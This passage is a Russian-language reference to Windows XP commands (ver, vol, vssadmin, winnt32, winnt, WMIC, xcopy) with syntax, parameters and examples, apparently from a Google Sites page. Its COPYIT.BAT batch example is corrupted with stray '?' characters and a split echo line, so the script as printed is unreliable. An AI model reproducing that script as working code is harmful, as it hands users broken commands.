/?
    Отображает справку в командной строке.

Примечания
- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Примеры

Чтобы удалить текущие параметры реестра производительности и текст объяснения счетчика для службы RSVP на компьютере comp1, введите:

unlodctr \\comp1 RSVP
========================================================================================
Ver

Отображение номера версии Windows XP.
Синтаксис

ver
Параметры

/?
    Отображает справку в командной строке.

========================================================================================
Vol

Отображает метку тома диска и серийный номер, если они существуют. Серийный номер выводится для дисков, отформатированных в версии MS-DOS версии 4.0 и более поздних.
Синтаксис

vol [диск:]
Параметры

диск:
    Задает имя дисковода, содержащего диск, для которого будет выведена метка тома и серийный номер.
/?
    Отображает справку в командной строке.

========================================================================================
Vssadmin

Отображает в окне командной строки архивы снимков состояния томов и все установленные системы записи снимков состояния и доступа к ним.
Синтаксис

Vssadmin list {shadows [/set= [код_GUID_набора_снимков_состояния]] | writers | providers}
Параметры

list shadows [/set= [код_GUID_набора_снимков_состояния]]
    Отображает все снимки состояния системы, объединенные кодом GUID в набор снимков состояния (группа снимков состояния, созданных в одно время).
list writers
    Отображает имя, код GUID, код (ID) экземпляра и статус всех установленных систем записи снимков состояния.
list providers
    Отображает имя, код GUID, и версии всех установленных систем доступа к снимкам состояния.
/?
    Отображает справку в командной строке.

Примеры

Чтобы вывести на экран все установленные системы доступа к снимкам состояния тома, введите следующую команду:

vssadmin list providers
========================================================================================
Winnt32

Выполняет установку или обновление до Windows XP. Программа winnt32 может быть запущена из командной строки на компьютере, работающем под управлением Windows 95, Windows 98, Windows Millennium Edition, Windows NT, Windows 2000 или Windows XP.

Примечание
- На компьютере с процессором Itanium команда winnt32 может быть выполнена с помощью расширенного интерфейса микропрограмм (EFI) или с помощью Windows XP (но не более ранних операционных систем). На компьютерах с процессорами Itanium, команды /cmdcons и /syspart, а также параметры обновления недоступны.
Синтаксис

winnt32 [/checkupgradeonly] [/cmd:командная_строка] [/cmdcons] [/copydir:{i386|ia64}\имя_папки] [/copysource:имя_папки] [/debug[уровень]:[имя_файла]] [/dudisable] [/duprepare:путь] [/dushare:путь] [/m:имя_папки] [/makelocalsource] [/noreboot] [/s:источник] [/syspart:буква_диска] [/tempdrive:буква_диска] [/udf:код [,файл_UDB]] [/unattend[число]:[файл_ответов]]
Параметры

/checkupgradeonly
    Проверяет возможность обновления до Windows XP.

    При использовании этого параметра с параметром /unattend ввод данных пользователем не требуется. В противном случае результаты отображаются на экране и их можно сохранить в файле с указанным именем. По умолчанию используется файл Upgrade.txt в системном корневом каталоге.
/cmd:командная_строка
    Указывает программе установки выполнить заданную команду перед завершающей фазой установки. Это происходит после перезагрузки компьютера и после сбора программой установки необходимых сведений о конфигурации, но перед завершением установки.
/cmdcons
    Устанавливает консоль восстановления в виде варианта загрузки на исправно работающий компьютер с прцессором х86. Консоль восстановления — это интерфейс командной строки, с помощью которого можно выполнять такие задачи, как запуск и остановка служб, а также осуществлять доступ к локальному диску (включая диски с файловой системой NTFS). Параметр /cmdcons может использоваться только после завершения обычной установки.
/copydir:{i386|ia64}\имя_папки
    Создает дополнительную папку внутри папки, в которую устанавливаются файлы Windows XP. Параметр имя_папки относится к папке, созданной для хранения изменений только вашего сайта. Например, на компьютерах с процессором х86 в исходной папке установки i386 может быть создана папка Private_drivers для хранения файлов драйверов. Затем можно ввести команду /copydir:i386\Private_drivers, чтобы программа установки скопировала эту папку на новый компьютер, создав новую папку системный_корневой_каталог\Private_drivers. Параметр /copydir можно использовать для создания любого необходимого числа дополнительных папок.
/copysource:имя_папки
    Создает временную дополнительную папку внутри папки, в которую устанавливаются файлы Windows XP. Параметр имя_папки относится к папке, созданной для хранения изменений только вашего сайта. Например, в исходной папке установки может быть создана папка Private_drivers для хранения файлов драйверов. Затем можно ввести команду /copysource:Private_drivers, чтобы программа установки скопировала эту папку на новый компьютер и использовала файлы из нее в процессе установки, создав временную папку системный_корневой_каталог\Private_drivers. Параметр /copysource можно использовать для создания любого необходимого числа дополнительных папок. В отличие от папок, созданных параметром /copydir, папки /copysource удаляются после завершения установки.
/debug[уровень]:[имя_файла]
    Создание журнала отладки на заданном уровне, например /debug4:Debug.log. По умолчанию создается файл журнала С:\системный_корневой_каталог\Winnt32.log с уровнем отладки, равным 2. Уровни журнала имеют следующие значения: — серьезные ошибки, 1 — ошибки, 2 — предупреждения, 3 —сообщения и 4 — подробные сообщения для отладки. Каждый уровень включает все уровни, расположенные ниже.
/dudisable
    Отключает динамическое обновление. Если динамическое обновление отключено, программа установки выполняется только с исходными файлами установки. Этот параметр отключает динамическое обновление, даже если используется файл ответов, в котором заданы параметры динамического обновления.
/duprepare:путь
    Задает выполнение операций по подготовке установочной общей папки для использования с файлами динамического обновления, которые загружаются с веб-узла Windows Update. Эта общая папка может использоваться для установки Windows XP на несколько клиентов.
/dushare:путь
    Обозначает общую папку, в которую ранее с веб-узла Windows Update загружались файлы динамического обновления (обновленные файлы, используемые программой установки) и которая ранее была указана в параметре/duprepare:путь. При выполнении на клиентском компьютере задает использование обновленных файлов из общей папки, заданной значением путь.
/m:имя_папки
    Задает копирование программой установки файлов замены из альтернативной папки. Программа установки ищет файлы сначала в альтернативной папке и, если находит их, использует файлы из альтернативной папки, а не из папки, используемой по умолчанию.
/makelocalsource
    Задает копирование программой установки всех исходных файлов установки на локальный жесткий диск. Используйте параметр /makelocalsource при установке с компакт-диска, чтобы скопировать файлы установки, если компакт диск будет недоступен позднее.
/noreboot
    Указывает программе установки не производить перезапуск компьютера после завершения фазы копирования файлов установки. Это позволяет выполнить другую команду.
/s:источник
    Задает местонахождение источника устанавливаемых файлов Windows XP. Для одновременного копирования файлов с нескольких серверов введите параметр /s:источник несколько раз (не более восьми). Если этот параметр введен несколько раз, первый из указанных серверов должен быть доступен; в противном случае произойдет сбой программы установки.
/syspart:буква_диска
    На компьютере с процессором х86 указывает программе установки скопировать загрузочные файлы на жесткий диск, пометить диск как активный и затем установить диск на другом компьютере. Когда этот компьютер запускается, он автоматически переходит на следующую фазу установки. Параметр /syspart всегда следует использовать вместе с параметром /tempdrive. Программа Winnt32 может быть запущена с параметром /syspart на компьютере, работающем под управлением Windows NT 4.0, Windows 2000 или Windows XP. Этот параметр не может использоваться на компьютерах под управлением Windows 95, Windows 98 или Windows Millennium Edition.
/tempdrive:буква_диска
    Задает имя раздела для размещения временных файлов в процессе установки. В случае новой установки операционная система Windows XP также будет установлена в указанный раздел. При обновлении параметр /tempdrive влияет только на размещение временных файлов; будет обновлена операционная система в том разделе, из которого была запущена программа winnt32.
/udf:код [,файл_UDB]
    Показывает идентификатор (код), который программа установки использует для указания способа изменения файла ответов файлом базы данных уникальности (Uniqueness Database, UDB) (см. описание ключа /unattend). Файл UDB изменяет значения в файле ответов, а идентификатор определяет используемые в файле UDB значения. Например, /udf:RAS_user,Our_company.udb переопределяет настройки для идентификатора RAS_user в файле Our_company.udb. Если файл_UDB не указан, программа настройки предлагает пользователю вставить диск, содержащий файл $Unique$.udb.
/unattend
    Обновляет предыдущую версию операционной системы Windows 98, Windows Millennium Edition, Windows NT 4.0 или Windows 2000 в автоматическом режиме. Все настройки, сделанные пользователем, считываются из файлов текущей версии системы. Таким образом, вмешательство пользователя в процесс установки не требуется.
/unattend[число]:[файл_ответов]
    Выполняет новую установку без вмешательства пользователя. Файл, указанный параметром файл_ответов, содержит особые спецификации. Число — число секунд между окончанием копирования файлов и перезагрузкой компьютера. Параметр число можно использовать на любом компьютере, работающем под управлением Windows 98, Windows Millennium Edition, Windows NT, Windows 2000 или Windows XP.

    Использование параметра командной строки /unattend для автоматизации процесса установки подтверждает факт прочтения и принятия лицензионного соглашения для Windows XP. Прежде чем использовать этот параметр командной строки при установке Windows XP от имени другой организации, следует убедиться в том, что конечный пользователь (отдельное лицо или организация) получил лицензионное соглашение для Windows XP, ознакомился с ним и принял его условия. Изготовители компьютеров не могут использовать этот ключ на компьютерах, продаваемых конечным пользователям.

========================================================================================
Winnt

Выполняет установку или обновление до Windows XP. При совместимости оборудования с операционной системой Windows XP, можно выполнить команду winnt из командной строки Windows 3x или в сеансе MS-DOS.
Синтаксис

winnt [/s:источник] [/t:временный_диск] [/u:файл_ответов][/udf:код [,файл_UDB]] [/r:папка][/rx:папка][/e:команда][/a]
Параметры

/s:источник
    Задает местонахождение источника устанавливаемых файлов Windows XP. Расположение должно быть задано полным путем в форме x:\[путь] или \\сервер\общая_папка[\путь].
/t:временный_диск
    Указывает размещение временных файлов на указанном диске и установку Windows XP на этом диске. Если местоположение не указано, программа установки попытается сама определить нужный диск.
/u:файл_ответов
    Выполняет установку без вмешательства пользователя с помощью файла ответов. Файл ответов содержит ответы на все или часть вопросов, задаваемых конечному пользователю во время установки. Параметр /u нужно использовать совместно с параметром /s.
/udf:код [,файл_UDB]
    Показывает идентификатор (код), который программа установки использует для указания способа изменения файла ответов файлом базы данных уникальности (Uniqueness Database, UDB) (см. описание ключа /u). Файл UDB изменяет значения в файле ответов, а идентификатор определяет используемые в файле UDB значения. Если файл_UDB не указан, программа настройки предлагает пользователю вставить диск, содержащий файл $Unique$.udb.
/r:папка
    Указывает необязательную папку для установки. Папка остается после завершения установки.
/rx:папка
    Указывает необязательную папку для копирования. Папка удаляется после завершения установки.
/e:команда
    Указывает программе установки выполнить заданную команду перед завершающей фазой установки.
/a
    Включает специальные возможности.
/?
    Отображает справку в командной строке.

========================================================================================
Использование средств WMIC

Программа WMIC представляет собой командную строку и интерфейс написания сценариев, которые упрощают использование инструментария управления Windows (WMI) и систем, управляемых с помощью WMI.

Программа WMIC основана на псевдонимах. С помощью псевдонимов можно получать доступ к основным данным инструментария WMI, не имея представления о его устройстве. Данные WMI и возможности WMI доступны через инструментарий управления без псевдонимов.

Вывести список доступных псевдонимов можно использованием параметра справки WMIC /?. Программа WMIC содержит встроенную справочную систему. Использование параметра /? возможно в любое время и на любой стадии для обнаружения дополнительных параметров текущего контекста. Параметр /? отображает доступные псевдонимы, команды и глобальные переключатели (т. е. переключатели, применяемые ко всей программе WMIC). Чтобы вывести на экран действия и переключали, доступные псевдониму, введите имя псевдоним и параметр /?. Для представления параметров, доступных определенному действию, введите имя псевдонима, действие и затем параметр /?.

Например, процессы, выполняющиеся в системе в настоящий момент, доступны в псевдониме PROCESS. Для просмотра всех процессов, выполняющихся на текущий момент на компьютере. введите PROCESS в служебную программу WMIC. Чтобы отобразить определенный процесс введите команду, подобную PROCESS WHERE (Description="explorer.exe"). Получить конкретные свойства процессов можно вводом такой команды как PROCESS GET Name, Handle, PageFaults.

Имеется возможность использовать те же параметры без применения псевдонимов с помощью команды CLASS Например, CLASS Win32_Process GET Name, Handle, PageFaults. Однако, необходимо определить имя класса из других источников. Условию псевдонима Where эквивалентно использование команды PATH Win32_Process.Description="explorer.exe".

Дополнительные сведения о использовании и расширении программы WMIC см. раздел Программа WMIC в справке Windows XP. В документации содержатся сведения об применении WMIC к пакетным файлам, для отчетов, на удаленном компьютере или на нескольких одновременно и для управления системой.
Параметр     Результат
/?     Вывод справки
CLASS     Явный ввод имени класса схемы WMI без использования применяемого по умолчанию псевдонима WMIC
PATH     Прямой доступ к экземплярам схемы WMI без использования применяемого по умолчанию псевдонима WMIC
CONTEXT     Отображение текущих значений всех глобальных переключателей
QUIT     Выход из программы WMIC
EXIT     Выход из программы WMIC
========================================================================================
Xcopy

Копирует файлы и каталоги, включая подкаталоги.
Синтаксис

xcopy источник [результат] [/w] [/p] [/c] [/v] [/q] [/f] [/l] [/g] [/d[:мм-дд-гггг]] [/u] [/i] [/s [/e]] [/t] [/k] [/r] [/h] [{/a|/m}] [/n] [/o] [/x] [/exclude:файл1[+[файл2]][+[файл3]] [{/y|/-y}] [/z]
Параметры

источник
    Обязательный параметр. Задает местонахождение и имена файлов для копирования. Параметр должен задавать или диск, или путь.
результат
    Задает место, куда будут скопированы файлы. Параметр может включать имя диска с двоеточием, имя каталога, имя файла или их комбинацию.
/w
    Выводит следующее сообщение с ожиданием подтверждения начала копирования:

    Нажмите любую клавишу, чтобы начать копирование файлов
/p
    Запрашивает подтверждение при создании каждого файла-результата.
/c
    Игнорирует ошибки.
/v
    Проверяет каждый скопированный файл на соответствие его оригиналу.
/q
    Отменяет вывод на экран сообщений команды xcopy.
/f
    Выводит имена исходных файлов и файлов-результатов в процессе копирования.
/l
    Отображает список копируемых файлов.
/g
    Создает незашифрованные файлы-результаты.
/d[:мм-дд-гггг]
    Копирует только файлы, измененные не ранее заданной даты. Если не включить значение мм-дд-гггг, команда xcopy копирует все файлы-источники, которые новее существующих файлов-результатов. Эта возможность позволяет обновлять только измененные файлы.
/u
    Копирует (обновляет) только те файлы-источники, которые уже существуют в каталоге результата.
/i
    Если источником является каталог или источник содержит подстановочные знаки и результат не существует, команда xcopy считает, что результат — это имя каталога, и создает новый каталог. Затем xcopy копирует все указанные файлы в новый каталог. По умолчанию команда xcopy запрашивает подтверждение, является ли параметр результат каталогом или файлом. 
/s
    Копирует каталоги и подкаталоги, если они не пусты. Если параметр /s не задан, команда xcopy будет работать только с одним каталогом.
/e
    Копирует все подкаталоги, включая пустые. Параметр /e используется с параметрами /s и /t.
/t
    Копирует только структуру подкаталога (т. е. дерево), а не файлы. Для копирования пустых каталогов следует задать ключ /e.
/k
    Копирует файлы с атрибутом «только для чтения» с сохранением этого атрибута для скопированных файлов, оригиналы которых имеют этот атрибут. По умолчанию команда xcopy удаляет атрибут «только для чтения».
/r
    Копирует файлы с атрибутом «только для чтения».
/h
    Копирует системные и скрытые файлы. По умолчанию команда xcopy не копирует системные и скрытые файлы.
/a
    Копирует только те файлы, которые имеют установленный атрибут «архивный». При использовании параметра /a атрибут "архивный" у исходных файлов не меняется. Сведения об установке атрибутов с помощью команды attrib см. по ссылке «».
/m
    Копирует только те файлы, которые имеют установленный атрибут «архивный». В отличие от параметра /a, параметр /m очищает атрибут «архивный» у скопированных файлов. Сведения об установке атрибутов с помощью команды attrib см. по ссылке «».
/n
    Копирует с использованием коротких имен файловой системы NTFS. Параметр /n требуется при копировании из файловой системы NTFS в файловую систему FAT или когда на диске-результате требуется использование соглашения об именах файлов как в файловой системе FAT (8.3). Файлы могут записываться в файловую систему FAT или NTFS.
/o
    Копирует сведения о принадлежности файлов и избирательной таблице управления доступом (DACL).
/x
    Копирует сведения о параметрах аудита файла и системной таблице управления доступом (SACL) (подразумевается наличие /p).
/exclude:файл1[+[файл2]][+[файл3]]
    Определяет список файлов, содежащих строки.
/y
    Устраняет выдачу запроса на подтверждение перезаписи существующего конечного файла.
/-y
    Выдает запрос на подтверждение перезаписи существующего конечного файла.
/z
    Копирует по сети в режиме перезапуска.
/?
    Отображает справку в командной строке.

Примечания
- Использование параметра /v - Использование параметра /exclude

Построчный вывод всех строк в каждом файле. При соответсвтии выведенной строки части пути копируемого файла, он исключается из процесса копирования. Например, если указана строка «\Obj\», исключается все файлы, расположенные в каталоге «Obj». Например, если указана строка «.obj», исключается все файлы с расширением .obj.
- Использование параметра /z

Если во время фазы копирования теряется сетевое подключение (например, если сервер переходит автономный режим, разрывая подключение), копирование возобновляется после восстановления подключения. Использование параметра /z команды вызывает также отображение доли (в процентах) завершенной операции копирования для каждого файла.
-Использование параметра /y в переменной среде COPYCMD.

Можно применять параметр /y в переменной среде COPYCMD. Эта настройка может быть переопределена использованием параметра /-y в командной строке. По умолчанию если команда copy выполняется не в пакетной программе, при замене требуется подтверждение.
- Копирование зашифрованных файлов

При копировании файлов на том, не поддерживающий шифрованную файловую систему (EFS), возникнет ошибка. Следует предварительно расшифровать файлы или копировать их на том, поддерживающий EFS.
- Добавление файлов

Чтобы объединить файлы, укажите один файл-результат, но несколько файлов-источников (с помощью подстановочных знаков или формата файл1+файл2+файл3).
- Значение по умолчанию для результата

Если параметр результат не задан, xcopy будет копировать файлы в текущий каталог.
- Указание в качестве результата файла или каталога

Если параметр результат не содержит существующий каталок или не заканчивается обратной чертой(\), выводится следующее сообщение:

Что означает destination:
имя файла или каталога
(F = файл, D = каталог)?

Нажмите F, если файл или файлы должны копироваться в файл. Нажмите D, если файл или файлы должны копироваться в каталог.

Чтобы устранить вывод этого сообщения, используйте параметр /i. В результате чего, команда xcopy предполагает, что результат является каталогом, если источник престаляет собой несколько файлов или каталогов.
- Использование команды xcopy для установки атрибута «архивный» для файлов результата

Команда xcopy создает файлы с установленным атрибутом «архивный», независимо от состояния этого атрибута у исходных файлов. Для получения дополнительных сведений об атрибутах файлов команде attrib см. ссылку «».
- Сравнение команд xcopy и diskcopy

Команда xcopy должна быть использована вместо diskcopy при копировании файлов и подкаталогов на диск другого формата. Так как команда diskcopy копирует диски по дорожкам, требуется, чтобы исходный диск и диск-результат имели одинаковый формат. Для команды xcopy это требование не нужно. Обычно следует использовать команду xcopy, если только не требуется получить два диска с одинаковыми образами.
- Коды завершения программы xcopy

Для анализа кодов завершения, выведенных командой xcopy, используйте параметр уровень_ошибки в командной строке if пакетных программ. Чтобы увидеть пример пакетной программы, обрабатывающей коды завершения с помощью if, щелкните ссылку «». В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Файлы скопированы без ошибок
1     Файлы для копирования не найдены
2     Нажата комбинация CTRL+C для остановки команды xcopy
4     Возникла ошибка инициализации. Недостаточно места в памяти или на диске, введено неверное имя диска или неверный синтаксис вызова команды
5     Диск защищен от записи
Примеры

Чтобы копировать все файлы и подкаталоги (включая пустые подкаталоги) с диска A на диск B, введите:

xcopy a: b: /s /e

Чтобы включить в операцию копирования предыдущего примера системные и скрытые файлы следует использовать параметр /h:

xcopy a: b: /s /e /h

Чтобы обновить файлы в каталоге \Reports файлами из каталога \Rawdata, измененными после 29 декабря 1993 года, введите:

xcopy \rawdata \reports /d:29-12-1993

Чтобы обновить файлы предыдущего примера, уже существующие в каталоге \Reports, независимо от их даты, введите следующую команду:

xcopy \rawdata \reports /u

Чтобы получить списк файлов, которые были бы скопированы в предыдущем примере, следует ввести команду:

xcopy \rawdata \reports /d:29-12-1993 /l > xcopy.out

Список файлов, которые были бы скопированы, находится в файле Xcopy.out.

Чтобы скопировать каталог \Customer и все подкаталоги \\Public\Address на сетевой диск H, сохранить у файлов атрибут «только для чтения», введите команду:

xcopy \customer h:\public\address /s /e /k /p

Чтобы выдать предыдущую команду, убедиться, что команда xcopy создает каталог \Address и устранить вывод сообщение о создании нового каталога, добавьте параметр /i следующим образом:

xcopy \customer h:\public\address /s /e /k /p /i

Для запуска программы xcopy и анализа кодов завершения можно создать пакетный файл и использовать оператор if для обработки кодов завершения в случае возникновения ошибок. Например, следующая пакетная программа использует замещаемые параметры для задания источникаxcopy и результата:

@echo off
rem COPYIT.BAT копирует все файлы во всех подкаталогах
rem исходного диска или каталога (%1) на другой диск

rem или в другой каталог (%2)

?? xcopy %1 %2 /s /e

??if errorlevel 4 goto lowmemory
?if errorlevel 2 goto abort
?if errorlevel 0 goto exit

??:lowmemory ?
echo Недостаточно памяти для копирования файлов,
задан недопустимый ?echo диск или ошибка в синтаксисе командной строки.
?goto exit
??
:abort ?
echo Нажата комбинация CTRL+C для остановки копирования.
?goto exit ?
?
:exit

Эта пакетная программа может быть использована для копирования всех файлов каталога C:\Prgmcode и его подкаталогов на диск B следующим образом:

copyit c:\prgmcode b:

Командный интерпретатор подставляет C:\Prgmcode вместо параметра %1 и B вместо параметра %2, затем использует команду xcopy с параметрами /e и /s. Если при выполнении xcopy произошла ошибка, пакетная программа считывает код завершения и переходит на метку, указанную в соответствующей инструкции IF ERRORLEVEL. В результате на экран выводится сообщение о характере ошибки и осуществляется выход из пакетной программы.
Č
ċ
utility-cmd-exe.htm (1701k)Moscow Sysadmin, 28 янв. 2013 г., 06:24
v.2ď
Комментарии
Войти|Последняя активность сайта|Пожаловаться|Печать страницы|На основе Google Сайтов
